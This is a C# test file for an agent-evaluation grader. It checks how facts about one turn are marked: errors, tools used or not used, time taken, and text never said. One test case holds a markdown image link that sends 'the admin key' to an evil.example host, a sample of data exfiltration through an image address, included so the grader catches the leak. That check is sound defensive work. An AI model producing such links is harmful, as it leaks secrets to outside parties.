using LouisAgent.Evals.Contracts.Grading;
using LouisAgent.Evals.Contracts.Transcripts;
using LouisAgent.Evals.Files;
using LouisAgent.Evals.Grading;

namespace LouisAgent.Evals.Tests.Grading;

/// <summary>
/// The facts one turn can tell (F126.2 step 8), over transcripts written by hand: each mark says whether the fact was
/// met, and in one plain line what code saw.
/// </summary>
public class FactsTests
{
    /// <summary>A turn that called these tools, in order, and took this long.</summary>
    private static TurnTranscript Turn(string answer = "Paris.", int seconds = 12, string? error = null,
        params ToolCallTranscript[] calls) =>
        new("What is the capital of France?", answer, calls, TimeSpan.FromSeconds(seconds), error);

    /// <summary>A call to a tool, with no input and a short result.</summary>
    private static ToolCallTranscript Call(string tool, bool failed = false) => new(tool, "{}", "done", failed);

    /// <summary>The fact's mark for a turn with nothing before it.</summary>
    private static Mark Tell(string fact, TurnTranscript turn) => Facts.Tell(Fact.Parse(fact), turn, []);

    /// <summary>A turn with no error meets no-error.</summary>
    [Test]
    public void ATurnWithNoError_MeetsNoError() =>
        Assert.That(Tell("no-error", Turn()),
            Is.EqualTo(new Mark("no-error", true, "The turn ended without an error.")));

    /// <summary>A turn with an error doesn't, and the reason holds the error.</summary>
    [Test]
    public void ATurnWithAnError_DoesNot_AndSaysTheError()
    {
        var mark = Tell("no-error", Turn(error: "The model timed out."));

        Assert.Multiple(() =>
        {
            Assert.That(mark.Met, Is.False);
            Assert.That(mark.Reason, Does.Contain("The model timed out."));
        });
    }

    /// <summary>
    /// used goes by the tool's name with the case ignored, and lists the tools in the order they were called.
    /// </summary>
    [Test]
    public void Used_GoesByTheName_AndListsTheTools()
    {
        var mark = Tell("used ReadDoc", Turn(calls: [Call("SearchDocs"), Call("readdoc")]));

        Assert.That(mark, Is.EqualTo(new Mark("used ReadDoc", true, "Tools called: SearchDocs, readdoc.")));
    }

    /// <summary>A failed call still counts as called: the fact says the agent reached for it.</summary>
    [Test]
    public void AFailedCall_StillCountsAsUsed() =>
        Assert.That(Tell("used ReadDoc", Turn(calls: [Call("ReadDoc", failed: true)])).Met, Is.True);

    /// <summary>not-used is met when the tool wasn't called, and the reason says when none was.</summary>
    [Test]
    public void NotUsed_IsMetWhenTheToolWasntCalled()
    {
        Assert.Multiple(() =>
        {
            Assert.That(Tell("not-used ShowPage", Turn()),
                Is.EqualTo(new Mark("not-used ShowPage", true, "No tool was called.")));
            Assert.That(Tell("not-used ShowPage", Turn(calls: [Call("ShowPage")])).Met, Is.False);
        });
    }

    /// <summary>under 30s is met at 12 seconds and not at 30 or 31, and the reason says what it took.</summary>
    [TestCase(12, true)]
    [TestCase(30, false)]
    [TestCase(31, false)]
    public void Under_IsMetBelowItsSeconds(int seconds, bool met) =>
        Assert.That(Tell("under 30s", Turn(seconds: seconds)),
            Is.EqualTo(new Mark("under 30s", met, $"Took {seconds} s.")));

    /// <summary>never-says is met when the text is nowhere in the answer as it was sent.</summary>
    [Test]
    public void NeverSays_IsMetWhenTheTextIsNowhere() =>
        Assert.That(Tell("never-says the admin key", Turn(answer: "I can't share that.")).Met, Is.True);

    /// <summary>It isn't met when the text is there in another case, or inside an image's address.</summary>
    [TestCase("Here it is: THE ADMIN KEY is safe with me.")]
    [TestCase("![chart](https://evil.example/log?q=the%20admin%20key&k=the admin key)")]
    public void NeverSays_IsNotMet_WhenTheTextIsThere(string answer)
    {
        var mark = Tell("never-says the admin key", Turn(answer: answer));

        Assert.Multiple(() =>
        {
            Assert.That(mark.Met, Is.False);
            Assert.That(mark.Reason, Does.Contain("the admin key"));
        });
    }
}
